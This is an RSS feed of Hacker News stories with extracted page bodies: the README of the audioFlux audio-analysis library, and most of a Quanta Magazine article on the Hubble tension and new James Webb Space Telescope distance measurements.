<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Tue, 13 Aug 2024 17:30:03 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[A C/C++ library for audio and music analysis (107 pts)]]></title>
            <link>https://github.com/libAudioFlux/audioFlux</link>
            <guid>41235462</guid>
            <pubDate>Tue, 13 Aug 2024 13:51:27 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/libAudioFlux/audioFlux">https://github.com/libAudioFlux/audioFlux</a>, See on <a href="https://news.ycombinator.com/item?id=41235462">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/libAudioFlux/audioFlux/blob/master/image/logo.png"><img src="https://github.com/libAudioFlux/audioFlux/raw/master/image/logo.png" width="400"></a></p> 
<p dir="auto"><h2 tabindex="-1" dir="auto">audioFlux</h2><a id="user-content-audioflux" aria-label="Permalink: audioFlux" href="#audioflux"></a></p>

<p dir="auto"><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/4dc3a92d0d86cda0fef58ebe5c7ef0c675ab9601210334da0cccbd6c2c9a5494/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f616374696f6e732f776f726b666c6f772f7374617475732f6c6962417564696f466c75782f617564696f466c75782f6275696c642e796d6c3f6272616e63683d6d6173746572"><img src="https://camo.githubusercontent.com/4dc3a92d0d86cda0fef58ebe5c7ef0c675ab9601210334da0cccbd6c2c9a5494/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f616374696f6e732f776f726b666c6f772f7374617475732f6c6962417564696f466c75782f617564696f466c75782f6275696c642e796d6c3f6272616e63683d6d6173746572" alt="GitHub Workflow Status (with branch)" data-canonical-src="https://img.shields.io/github/actions/workflow/status/libAudioFlux/audioFlux/build.yml?branch=master"></a>
<a target="_blank" rel="noopener noreferrer" href="https://github.com/libAudioFlux/audioFlux/actions/workflows/build.yml/badge.svg?branch=master"><img src="https://github.com/libAudioFlux/audioFlux/actions/workflows/build.yml/badge.svg?branch=master" alt="example branch parameter"></a>
<a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/646a031f23b7ac1250d4edabb5ad7c20449a0d08894cc89b40497c1b01718bea/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6c616e67756167652d43253230253743253230507974686f6e2532302d626c75652e737667"><img src="https://camo.githubusercontent.com/646a031f23b7ac1250d4edabb5ad7c20449a0d08894cc89b40497c1b01718bea/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6c616e67756167652d43253230253743253230507974686f6e2532302d626c75652e737667" alt="language" data-canonical-src="https://img.shields.io/badge/language-C%20%7C%20Python%20-blue.svg"></a>
<a href="https://pypi.org/project/audioflux/" rel="nofollow"><img src="https://camo.githubusercontent.com/f192d1be4502fda24a4edac908c1f4db58445065cc87d51038e00ea7405a6462/68747470733a2f2f696d672e736869656c64732e696f2f707970692f762f617564696f666c7578" alt="PyPI - Version" data-canonical-src="https://img.shields.io/pypi/v/audioflux"></a>
<a href="https://pypi.org/project/audioflux/" rel="nofollow"><img src="https://camo.githubusercontent.com/12b6641aeaf9744d0529f12414c489ea9432bdbac24339a9ff62088f39daeb77/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f707974686f6e2d253345253344332e362d627269676874677265656e" alt="PyPI - Python Version" data-canonical-src="https://img.shields.io/badge/python-%3E%3D3.6-brightgreen"></a>
<a href="https://audioflux.top/index.html" rel="nofollow"><img src="https://camo.githubusercontent.com/e5c7a5d4270e5b9a2748b041243f94793f1d415a8d11431f87f8c4e2893f4a29/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f446f63732d70617373696e672d627269676874677265656e" alt="Docs" data-canonical-src="https://img.shields.io/badge/Docs-passing-brightgreen"></a>
<a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/c8fcc2972b3f7afeb1bb8d2f1236e07402344b85c53eddaa5855c72f359ee625/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f6c6963656e73652f6c6962417564696f466c75782f617564696f466c7578"><img src="https://camo.githubusercontent.com/c8fcc2972b3f7afeb1bb8d2f1236e07402344b85c53eddaa5855c72f359ee625/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f6c6963656e73652f6c6962417564696f466c75782f617564696f466c7578" alt="GitHub" data-canonical-src="https://img.shields.io/github/license/libAudioFlux/audioFlux"></a></p>

<p dir="auto"><a href="https://doi.org/10.5281/zenodo.7548288" rel="nofollow"><img src="https://camo.githubusercontent.com/1f081cad557bc3b49d8c1a4bf71f5e49358b5bcb9e23e47ddba7a7571fdab753/68747470733a2f2f7a656e6f646f2e6f72672f62616467652f444f492f31302e353238312f7a656e6f646f2e373534383238382e737667" alt="DOI" data-canonical-src="https://zenodo.org/badge/DOI/10.5281/zenodo.7548288.svg"></a></p>

<p dir="auto"><strong><code>audioflux</code></strong> is a deep learning tool library for audio and music analysis, feature extraction. It supports dozens of
time-frequency analysis transformation methods and hundreds of corresponding time-domain and frequency-domain feature
combinations. It can be provided to deep learning networks for training, and is used to study various tasks in the audio
field such as Classification, Separation, Music Information Retrieval(MIR) and ASR etc.</p>

<p dir="auto"><h5 tabindex="-1" dir="auto">New Features</h5><a id="user-content-new-features" aria-label="Permalink: New Features" href="#new-features"></a></p>
<ul dir="auto">
<li>v0.1.8
<ul dir="auto">
<li>Add a variety of Pitch algorithms: <code>YIN</code>, <code>CEP</code>, <code>PEF</code>, <code>NCF</code>, <code>HPS</code>, <code>LHS</code>, <code>STFT</code> and <code>FFP</code>.</li>
<li>Add <code>PitchShift</code> and <code>TimeStretch</code> algorithms.</li>
</ul>
</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Table of Contents</h3><a id="user-content-table-of-contents" aria-label="Permalink: Table of Contents" href="#table-of-contents"></a></p>
<ul dir="auto">
<li><a href="#overview">Overview</a></li>
<li><a href="#installation">Installation</a>
<ul dir="auto">
<li><a href="#python-package-install">Python Package Install</a></li>
<li><a href="#other-build">Other Build</a></li>
</ul>
</li>
<li><a href="#quickstart">Quickstart</a></li>
<li><a href="#benchmark">Benchmark</a></li>
<li><a href="#documentation">Documentation</a></li>
<li><a href="#contributing">Contributing</a></li>
<li><a href="#citing">Citing</a></li>
<li><a href="#license">License</a></li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Overview</h2><a id="user-content-overview" aria-label="Permalink: Overview" href="#overview"></a></p>
<p dir="auto"><strong><code>audioFlux</code></strong> is based on data stream design. It decouples each algorithm module in structure, and can quickly and
efficiently extract features of multiple dimensions. The following is the main feature architecture diagram.</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/libAudioFlux/audioFlux/blob/master/image/feature_all.png"><img src="https://github.com/libAudioFlux/audioFlux/raw/master/image/feature_all.png"></a></p>

<p dir="auto">You can use multiple dimensional feature combinations, select different deep learning networks training, study various
tasks in the audio field such as Classification, Separation, MIR etc.</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/libAudioFlux/audioFlux/blob/master/image/flow.png"><img src="https://github.com/libAudioFlux/audioFlux/raw/master/image/flow.png"></a></p>
<p dir="auto">The main functions of <strong><code>audioFlux</code></strong> include <strong>transform</strong>, <strong>feature</strong> and <strong>mir</strong> modules.</p>
<p dir="auto"><h4 tabindex="-1" dir="auto">1. Transform</h4><a id="user-content-1-transform" aria-label="Permalink: 1. Transform" href="#1-transform"></a></p>
<p dir="auto">In the time–frequency representation, main transform algorithm:</p>
<ul dir="auto">
<li><strong><code>BFT</code></strong>&nbsp;&nbsp; - &nbsp;&nbsp;Based Fourier Transform, similar short-time Fourier transform.</li>
<li><strong><code>NSGT</code></strong> - &nbsp; Non-Stationary Gabor Transform.</li>
<li><strong><code>CWT</code></strong>&nbsp;&nbsp; - &nbsp;&nbsp;Continuous Wavelet Transform.</li>
<li><strong><code>PWT</code></strong>&nbsp;&nbsp; - &nbsp;&nbsp;Pseudo Wavelet Transform.</li>
</ul>

<p dir="auto">The above transform supports all the following frequency scale types:</p>
<ul dir="auto">
<li>Linear - Short-time Fourier transform spectrogram.</li>
<li>Linspace - Linspace-scale spectrogram.</li>
<li>Mel - Mel-scale spectrogram.</li>
<li>Bark - Bark-scale spectrogram.</li>
<li>Erb - Erb-scale spectrogram.</li>
<li>Octave - Octave-scale spectrogram.</li>
<li>Log - Logarithmic-scale spectrogram.</li>
</ul>
<p dir="auto">The following transform are not supports multiple frequency scale types, only used as independent transform:</p>
<ul dir="auto">
<li><strong><code>CQT</code></strong> - &nbsp;&nbsp;Constant-Q Transform.</li>
<li><strong><code>VQT</code></strong> - &nbsp;&nbsp;Variable-Q Transform.</li>
<li><strong><code>ST</code></strong>&nbsp;&nbsp; - &nbsp;&nbsp;S-Transform/Stockwell Transform.</li>
<li><strong><code>FST</code></strong> - &nbsp;&nbsp;Fast S-Transform.</li>
<li><strong><code>DWT</code></strong> - &nbsp;&nbsp;Discrete Wavelet Transform.</li>
<li><strong><code>WPT</code></strong> - &nbsp;&nbsp;Wave Packet Transform.</li>
<li><strong><code>SWT</code></strong> - &nbsp;&nbsp;Stationary Wavelet Transform.</li>
</ul>
<p dir="auto">Detailed transform function, description, and use view the documentation.</p>
<p dir="auto">The <em><em>synchrosqueezing</em></em> or <em><em>reassignment</em></em> is a technique for sharpening a time-frequency representation, contains the
following algorithms:</p>
<ul dir="auto">
<li><strong><code>reassign</code></strong> - reassign transform for <code>STFT</code>.</li>
<li><strong><code>synsq</code></strong> - reassign data use <code>CWT</code> data.</li>
<li><strong><code>wsst</code></strong> - reassign transform for <code>CWT</code>.</li>
</ul>
<p dir="auto"><h4 tabindex="-1" dir="auto">2. Feature</h4><a id="user-content-2-feature" aria-label="Permalink: 2. Feature" href="#2-feature"></a></p>
<p dir="auto">The feature module contains the following algorithms:</p>
<ul dir="auto">
<li><strong><code>spectral</code></strong> - Spectrum feature, supports all spectrum types.</li>
<li><strong><code>xxcc</code></strong> - Cepstrum coefficients, supports all spectrum types.</li>
<li><strong><code>deconv</code></strong> - Deconvolution for spectrum, supports all spectrum types.</li>
<li><strong><code>chroma</code></strong> - Chroma feature, only supports <code>CQT</code> spectrum, Linear/Octave spectrum based on <code>BFT</code>.</li>
</ul>

<p dir="auto"><h4 tabindex="-1" dir="auto">3. MIR</h4><a id="user-content-3-mir" aria-label="Permalink: 3. MIR" href="#3-mir"></a></p>
<p dir="auto">The mir module contains the following algorithms:</p>
<ul dir="auto">
<li><strong><code>pitch</code></strong> - YIN, STFT, etc algorithm.</li>
<li><strong><code>onset</code></strong> - Spectrum flux, novelty, etc algorithm.</li>
<li><strong><code>hpss</code></strong> - Median filtering, NMF algorithm.</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Installation</h2><a id="user-content-installation" aria-label="Permalink: Installation" href="#installation"></a></p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/25c8cbe0feb4b33d8afb811cc30e8ccf30858800e21016894192addbe8184154/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f706c6174666f726d2d2532304c696e75782532302537432532306d61634f5325323025374325323057696e646f7773253230253743253230694f53253230253743253230416e64726f69642532302d6c79656c6c6f772e737667"><img src="https://camo.githubusercontent.com/25c8cbe0feb4b33d8afb811cc30e8ccf30858800e21016894192addbe8184154/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f706c6174666f726d2d2532304c696e75782532302537432532306d61634f5325323025374325323057696e646f7773253230253743253230694f53253230253743253230416e64726f69642532302d6c79656c6c6f772e737667" alt="language" data-canonical-src="https://img.shields.io/badge/platform-%20Linux%20%7C%20macOS%20%7C%20Windows%20%7C%20iOS%20%7C%20Android%20-lyellow.svg"></a></p>
<p dir="auto">The library is cross-platform and currently supports Linux, macOS, Windows, iOS and Android systems.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Python Package Install</h3><a id="user-content-python-package-install" aria-label="Permalink: Python Package Install" href="#python-package-install"></a></p>
<p dir="auto">To install the <strong>audioFlux</strong> package, Python &gt;=3.6, using the released python package.</p>
<p dir="auto">Using PyPI:</p>

<p dir="auto">Using Anaconda:</p>
<div data-snippet-clipboard-copy-content="$ conda install -c tanky25 -c conda-forge audioflux"><pre><code>$ conda install -c tanky25 -c conda-forge audioflux
</code></pre></div>

<p dir="auto"><h3 tabindex="-1" dir="auto">Other Build</h3><a id="user-content-other-build" aria-label="Permalink: Other Build" href="#other-build"></a></p>
<ul dir="auto">
<li><a href="https://github.com/libAudioFlux/audioFlux/blob/master/docs/installing.md#ios-build">iOS build</a></li>
<li><a href="https://github.com/libAudioFlux/audioFlux/blob/master/docs/installing.md#android-build">Android build</a></li>
<li><a href="https://github.com/libAudioFlux/audioFlux/blob/master/docs/installing.md#building-from-source">Building from source</a></li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Quickstart</h2><a id="user-content-quickstart" aria-label="Permalink: Quickstart" href="#quickstart"></a></p>
<ul dir="auto">
<li><a href="https://github.com/libAudioFlux/audioFlux/blob/master/docs/examples.md#mel--mfcc">Mel &amp; MFCC</a></li>
<li><a href="https://github.com/libAudioFlux/audioFlux/blob/master/docs/examples.md#cwt--synchrosqueezing">CWT &amp; Synchrosqueezing</a></li>
<li><a href="https://github.com/libAudioFlux/audioFlux/blob/master/docs/examples.md#cqt--chroma">CQT &amp; Chroma</a></li>
<li><a href="https://github.com/libAudioFlux/audioFlux/blob/master/docs/examples.md#different-wavelet-type">Different Wavelet Type</a></li>
<li><a href="https://github.com/libAudioFlux/audioFlux/blob/master/docs/examples.md#spectral-features">Spectral Features</a></li>
<li><a href="https://github.com/libAudioFlux/audioFlux/blob/master/docs/examples.md#pitch-estimate">Pitch Estimate</a></li>
<li><a href="https://github.com/libAudioFlux/audioFlux/blob/master/docs/examples.md#onset-detection">Onset Detection</a></li>
<li><a href="https://github.com/libAudioFlux/audioFlux/blob/master/docs/examples.md#harmonic-percussive-source-separation">Harmonic Percussive Source Separation</a></li>
</ul>
<p dir="auto">More example scripts are provided in the <a href="https://audioflux.top/" rel="nofollow">Documentation</a> section.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Benchmark</h2><a id="user-content-benchmark" aria-label="Permalink: Benchmark" href="#benchmark"></a></p>
<p dir="auto">server hardware:</p>
<div data-snippet-clipboard-copy-content="- CPU: AMD Ryzen Threadripper 3970X 32-Core Processor"><pre><code>- CPU: AMD Ryzen Threadripper 3970X 32-Core Processor
</code></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/libAudioFlux/audioFlux/blob/master/docs/image/benchmark/linux_amd_1.png"><img src="https://github.com/libAudioFlux/audioFlux/raw/master/docs/image/benchmark/linux_amd_1.png" width="800"></a></p>
<p dir="auto">More detailed performance benchmark are provided in the <a href="https://github.com/libAudioFlux/audioFlux/tree/master/benchmark">Benchmark</a> module.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Documentation</h2><a id="user-content-documentation" aria-label="Permalink: Documentation" href="#documentation"></a></p>
<p dir="auto">Documentation of the package can be found online:</p>
<p dir="auto"><a href="https://audioflux.top/" rel="nofollow">https://audioflux.top</a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Contributing</h2><a id="user-content-contributing" aria-label="Permalink: Contributing" href="#contributing"></a></p>
<p dir="auto">We are more than happy to collaborate and receive your contributions to <strong><code>audioFlux</code></strong>. If you want to contribute,
please fork the latest git repository and create a feature branch. Submitted requests should pass all continuous
integration tests.</p>
<p dir="auto">You are also more than welcome to suggest any improvements, including proposals for need help, find a bug, have a
feature request, ask a general question, new algorithms. <a href="https://github.com/libAudioFlux/audioFlux/issues/new">
Open an issue</a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Citing</h2><a id="user-content-citing" aria-label="Permalink: Citing" href="#citing"></a></p>
<p dir="auto">If you want to cite <strong><code>audioFlux</code></strong> in a scholarly work, please use the following ways:</p>
<ul dir="auto">
<li>
<p dir="auto">If you are using the library for your work, for the sake of reproducibility, please cite the version you used as
indexed at Zenodo:</p>
<p dir="auto"><a href="https://doi.org/10.5281/zenodo.7548288" rel="nofollow"><img src="https://camo.githubusercontent.com/1f081cad557bc3b49d8c1a4bf71f5e49358b5bcb9e23e47ddba7a7571fdab753/68747470733a2f2f7a656e6f646f2e6f72672f62616467652f444f492f31302e353238312f7a656e6f646f2e373534383238382e737667" alt="DOI" data-canonical-src="https://zenodo.org/badge/DOI/10.5281/zenodo.7548288.svg"></a></p>
</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">License</h2><a id="user-content-license" aria-label="Permalink: License" href="#license"></a></p>
<p dir="auto">audioFlux project is available MIT License.</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The Webb Telescope Further Deepens the Biggest Controversy in Cosmology (121 pts)]]></title>
            <link>https://www.quantamagazine.org/the-webb-telescope-further-deepens-the-biggest-controversy-in-cosmology-20240813/</link>
            <guid>41234964</guid>
            <pubDate>Tue, 13 Aug 2024 12:50:54 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.quantamagazine.org/the-webb-telescope-further-deepens-the-biggest-controversy-in-cosmology-20240813/">https://www.quantamagazine.org/the-webb-telescope-further-deepens-the-biggest-controversy-in-cosmology-20240813/</a>, See on <a href="https://news.ycombinator.com/item?id=41234964">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="postBody"><div><p>A long-awaited study of the cosmic expansion rate suggests that when it comes to the Hubble tension, cosmologists are still missing something.</p></div><figure><div><p><img alt="The universe expands from a point on the left side of the illustration and grows wider toward the right. But there’s a question mark stamped in the middle, and the gold hexagonal mirrors of the James Webb Space Telescope floating at the right edge." src="https://d2r55xnwy6nx47.cloudfront.net/uploads/2024/08/HubbleTensionUpdate-crNicoRoper-Lede-scaled.webp"></p></div><figcaption><div><p>Three new measurements using the James Webb Space Telescope have led some to question if the Hubble tension is real.</p><p>Nico Roper/<em>Quanta Magazine</em></p></div></figcaption></figure><div><h2>Introduction</h2><div><p>Nearly a century ago, Edwin Hubble discovered that the universe is getting larger. Modern measurements of how fast it is expanding disagree, however, suggesting that our understanding of the laws of physics might be off. Everyone expected the sharp vision of the James Webb Space Telescope to bring the answer into focus. But a long-awaited analysis of the telescope’s observations released late Monday evening once again gleans conflicting expansion rates from different types of data, while homing in on possible sources of error at the heart of the conflict.</p>
<p>Two rival teams have led the effort to measure the cosmic expansion rate, which is known as the Hubble constant, or H<sub>0</sub>. One of these teams, led by <a href="https://physics-astronomy.jhu.edu/directory/adam-riess/">Adam Riess</a> of Johns Hopkins University, has consistently measured H<sub>0</sub> to be about 8% higher than the theoretical prediction for how fast space should be expanding, based on the cosmos’s known ingredients and governing equations. This discrepancy, known as the Hubble tension, suggests that the theoretical model of the cosmos might be missing something — some extra ingredient or effect that speeds up cosmic expansion. Such an ingredient could be a clue to a more complete understanding of the universe.</p>
<p>Riess and his team released <a href="https://iopscience.iop.org/article/10.3847/2041-8213/ad1ddd">their latest measurement</a> of H<sub>0</sub> based on Webb data this spring, getting a value that agrees with their earlier estimates.</p>
<p>But for years a rival team led by <a href="https://astro.uchicago.edu/people/wendy-l-freedman.php">Wendy Freedman</a> of the University of Chicago has urged caution, arguing that cleaner measurements were needed. Her team’s own measurements of H<sub>0</sub> have invariably landed closer than Riess’ to the theoretical prediction, implying that the Hubble tension may not be real.</p>
<p>Since the Webb telescope started taking data in 2022, the astrophysics community has awaited Freedman’s multipronged analysis using the telescope’s observations of three types of stars. Now, the results are in: Two types of stars yield H<sub>0</sub> estimates that align with the theoretical prediction, while the third — the same type of star Riess uses — matches his team’s higher H<sub>0</sub> value.</p>
</div></div><figure><div><p><img alt="" src="https://d2r55xnwy6nx47.cloudfront.net/uploads/2024/08/Hubble_Tension-crMarkBelan-Desktop-v2.svg"></p><figcaption><div><p>Mark Belan for <em>Quanta Magazine</em></p></div></figcaption></div><figcaption><div><p>Mark Belan for <em>Quanta Magazine</em></p></div></figcaption></figure><div><h2>Introduction</h2><div><p>That the three methods disagree “is not telling us about fundamental physics,” Freedman said. “That’s telling us there’s some systematic [error] in one or more of the distance methods.”</p>
<p><a href="https://arxiv.org/abs/2408.06153">Freedman’s results</a> have been submitted to <em>The Astrophysical Journal</em> but have not yet undergone formal peer review, where outside researchers anonymously check the data and analysis. <a href="https://physics.berkeley.edu/people/faculty/saul-perlmutter">Saul Perlmutter</a>, a Nobel Prize-winning cosmologist at the University of California, Berkeley, who was shown the team’s preprint prior to its release, told <em>Quanta</em> that the results suggest “we may have a Hubble tension just within the [star-based] measurements. That’s the tension that we really have to be trying to figure out more than trying to invent new [cosmological] models.”</p>
<p>The results come after months of behind-the-scenes drama, as Freedman initially thought her analysis had killed the Hubble tension, only to see it come roaring back to life. “It’s been really … not dull, I’ll put it that way,” she said.</p>
<p>That’s business as usual. According to Perlmutter, “The Hubble constant has such a long and glorious tradition of being an impossible decades-long problem.”</p>
<h2><strong>A Clashing Universe</strong></h2>
<p>The hard part of gauging cosmic expansion is measuring distances to objects in space. The American astronomer Henrietta Leavitt first <a href="https://ui.adsabs.harvard.edu/abs/1912HarCi.173....1L/abstract">uncovered</a> a way to do this in 1912 using pulsating stars called Cepheids. These stars flicker at a rate that relates to (and can therefore reveal) their intrinsic luminosity. Once you know how luminous a Cepheid is, you can compare that to how bright or dim it appears to estimate how far away its galaxy is.</p>
<p>Edwin Hubble used Leavitt’s method to measure the distances to a handful of galaxies with Cepheids in them, discovering in 1929 that galaxies farther from us are moving away faster. That means the universe is expanding. Hubble pegged the expansion rate at 500 kilometers per second per megaparsec (km/s/Mpc), meaning that two galaxies separated by 1 Mpc, or about 3.2 million light-years, fly apart at 500 km/s.</p>
<p>That was wildly off.</p>
</div></div><figure><div><p><img alt="Black-and-white photo of a man with a pipe looking into the eyepiece of a huge telescope." src="https://d2r55xnwy6nx47.cloudfront.net/uploads/2024/08/EdwinHubble-1949-coCaltechArchivesAndSpecialCollections-scaled.webp"></p></div><figcaption><div><p>The American astronomer Edwin Hubble, discoverer of cosmic expansion, is pictured in 1949 peering into the Schmidt telescope at the Palomar Observatory near San Diego.</p><p>Courtesy of the Caltech Archives and Special Collections</p></div></figcaption></figure><div><h2>Introduction</h2><div><p>Measurements of H<sub>0</sub> improved as astronomers got better at calibrating the relationship between Cepheids’ pulsation frequency and their luminosity. Still, the whole approach was limited because Cepheids are only so bright. To measure the distance to galaxies across the vastness of the universe, scientists would need a new approach.</p>
<p>In the 1970s, researchers started using Cepheids to calibrate the distances to bright supernovas, enabling more accurate measurements of H<sub>0</sub>. Then as now, two research teams led the way, using supernovas anchored to Cepheids and arriving at disagreeing values of 50 km/s/Mpc and 100 km/s/Mpc. “There was no meeting of minds ever; they were just completely polarized,” said <a href="https://people.ast.cam.ac.uk/~gpe/">George Efstathiou</a>, an astrophysicist at the University of Cambridge.</p>
<p>The 1990 launch of the Hubble Space Telescope gave astronomers a new, crisp view of the universe. Freedman led a multiyear observing campaign using Hubble, and in 2001, she and her colleagues <a href="https://iopscience.iop.org/article/10.1086/320638">announced</a> an expansion rate of 72 km/s/Mpc, estimating that this was at most 10% off.</p>

<p>Riess, who is one of the Nobel Prize-winning discoverers of dark energy, jumped into the cosmic expansion game a few years later. In 2011, his team published an H<sub>0</sub> value of 73 with an estimated 3% uncertainty.</p>
<p>Soon after this, cosmologists pioneered another method entirely. In 2013, they used the Planck telescope’s observations of light left over from the early universe to determine the detailed shape and composition of the primordial cosmos. They then plugged those ingredients into Einstein’s general theory of relativity and evolved the theoretical model forward nearly 14 billion years to predict the current state of the universe. This extrapolation <a href="https://www.aanda.org/articles/aa/full_html/2020/09/aa33910-18/aa33910-18.html">predicts</a> that the cosmos should currently be expanding at a rate of 67.4 km/s/Mpc, with an uncertainty that’s less than 1%.</p>
<p>Riess’ team’s measurement, even as its precision improved, stayed at 73. This higher value implies that galaxies today are flying apart faster than they should be according to theory. The Hubble tension was born. “If it’s a real feature of the universe, then it’s telling us that we’re missing something in the cosmological model,” Riess said.</p>
<p>This missing something would be the first new ingredient of the cosmos to be discovered since dark energy. Theorists have <a href="https://www.quantamagazine.org/why-is-the-universe-expanding-so-fast-20200427/">speculated about its identity</a>: Perhaps it is an additional form of repulsive energy that lasted for a brief time in the early universe? Or maybe it’s <a href="https://www.quantamagazine.org/the-hidden-magnetic-universe-begins-to-come-into-view-20200702/">primordial magnetic fields</a> generated during the Big Bang?</p>
<p>Or maybe the something that’s missing has more to do with us than the universe.</p>
<h2><strong>Ways of Seeing </strong></h2>
<p>Some cosmologists, including Freedman, have suspected that unrecognized errors are to blame for the discrepancy.</p>
<p>The most common argument in this vein is that Cepheid stars live in the disks of younger galaxies, in regions crowded with stars, dust and gas. “Even with the exquisite resolution of [Hubble], you don’t see a single Cepheid,” Efstathiou said, “you see it superimposed with other stars.” This congestion complicates brightness measurements.</p>
<p>When the house-size Webb telescope launched in December 2021, Riess and his colleagues turned to its powerful infrared camera to pierce the dust in the crowded regions where Cepheids live. They sought to test if crowding has as strong an effect as Freedman and other researchers have claimed.</p>
</div></div><figure><div><p><img alt="Photo of the giant, gold-plated mirror of the James Webb Space Telescope sitting in a clean room with people in bunny suits milling about." src="https://d2r55xnwy6nx47.cloudfront.net/uploads/2024/08/JWST-crDesireeStover_NASA-scaled.webp"></p></div><figcaption><div><p>The 6.5-meter segmented mirror of the James Webb Space Telescope underwent tests at NASA’s Goddard Space Flight Center in Greenbelt, Maryland, in 2017, years before its December 2021 launch.</p><p>Desiree Stover/NASA</p></div></figcaption></figure><div><h2>Introduction</h2><div><p>When they compared their new numbers to the distances calculated from Hubble telescope data, “we saw phenomenal agreement,” said <a href="https://www.stsci.edu/stsci-research/research-directory/gagandeep-anand">Gagandeep Anand</a>, a member of the team based at the Space Telescope Science Institute. “That tells us, basically, that the work that has been done with Hubble is still good.”</p>
<p>Their latest results with Webb reaffirm the H<sub>0</sub> value that they <a href="https://iopscience.iop.org/article/10.3847/2041-8213/ac5c5b">measured</a> with Hubble a few years ago: 73.0, give or take 1.0 km/s/Mpc.</p>
<p>Given the crowding concern, though, Freedman had already turned to alternative stars that could serve as distance indicators. These are found in the outskirts of galaxies, far from the madding crowd.</p>
<p>One type is “tip-of-the-red-giant-branch,” or TRGB, stars. A red giant is an elderly star with a puffed-up atmosphere that glows brightly in red light. As it ages, a red giant will eventually ignite the helium in its core. At that moment, both the star’s temperature and its brightness suddenly drop off, said Kristen McQuinn, an astronomer at the Space Telescope Science Institute who led a Webb telescope project to calibrate distance measurements with TRGBs.</p>
<p>A typical galaxy has many red giants. If you plot the brightness of these stars against their temperatures, you’ll see the point at which their brightness drops off. The population of stars right before the drop is a good distance indicator, because in every galaxy, that population will have a similar spread of luminosities. By comparing the observed brightness of these stellar populations, astronomers can estimate relative distances.</p>
<p>(With any method, the physicists must deduce the absolute distance of at least one “anchor” galaxy in order to calibrate the whole scale. For their anchor, Riess, Freedman and other groups use an unusual nearby galaxy whose absolute distance has been <a href="https://arxiv.org/abs/astro-ph/9907013">determined geometrically</a> through a parallax-like effect.)</p>

<p>Using TRGBs as distance indicators is more complex than using Cepheids, however. McQuinn and her colleagues used nine of the Webb telescope’s wavelength filters to <a href="https://iopscience.iop.org/article/10.3847/1538-4357/ad306d">understand precisely</a> how their brightness depends on their color.</p>
<p>Astronomers are also beginning to turn to a new distance indicator: carbon-rich giant stars that belong to what’s called the J-region asymptotic giant branch (JAGB). These stars also sit away from a galaxy’s bright disk and emit a lot of infrared light. The technology to observe them at great distances wasn’t adequate until the Webb era, said Freedman’s graduate student Abigail Lee.</p>
<p>Freedman and her team applied for Webb telescope time to observe TRGBs and JAGBs along with the more established distance indicators, the Cepheids, in 11 galaxies. “I am a strong proponent of different methods,” she said.</p>
<h2><strong>An Evaporating Solution </strong></h2>
<p>On March 13, 2024, Freedman, Lee and the rest of their team sat around a table in Chicago to reveal what they had been hiding from themselves. Over the previous months, they had split into three groups. Each was tasked with measuring the distance to the 11 galaxies in their study using one of three methods: Cepheids, TRGBs or JAGBs. The galaxies also hosted the relevant kinds of supernovas, so their distances could calibrate the distances of supernovas in many more galaxies farther away. How fast these farther galaxies are receding from us (which is easily read off from their color) divided by their distances gives H<sub>0</sub>.</p>
<p>The three groups had calculated their distance measurements with a unique random offset added to the data. When they met in person, they removed each of the offsets and compared the results.</p>
<p>All three methods gave similar distances, within 3% uncertainty. It was “sort of jaw-dropping,” Freedman said. The team calculated three H<sub>0</sub> values, one for each distance indicator. All came within range of the theoretical prediction of 67.4.</p>
<p>At that moment, they appeared to have erased the Hubble tension. But when they dug into the analysis to write up the results, they found problems.</p>
<p>The JAGB analysis was fine, but the other two were off. The team noticed that there were large error bars on the TRGB measurement. They tried to shrink them by including more TGRBs. But when they did so, they found that the distance to the galaxies was smaller than they first thought. The change yielded a larger H<sub>0</sub> value.</p>
<p>In the Cepheid analysis, Freedman’s team uncovered an error: In about half the Cepheids, the correction for crowding had been applied twice. Fixing that significantly increased the resulting H<sub>0</sub> value. It “brought us more into agreement with Adam [Riess], which ought to make him a little happier,” Freedman said. The Hubble tension was resurrected.</p>
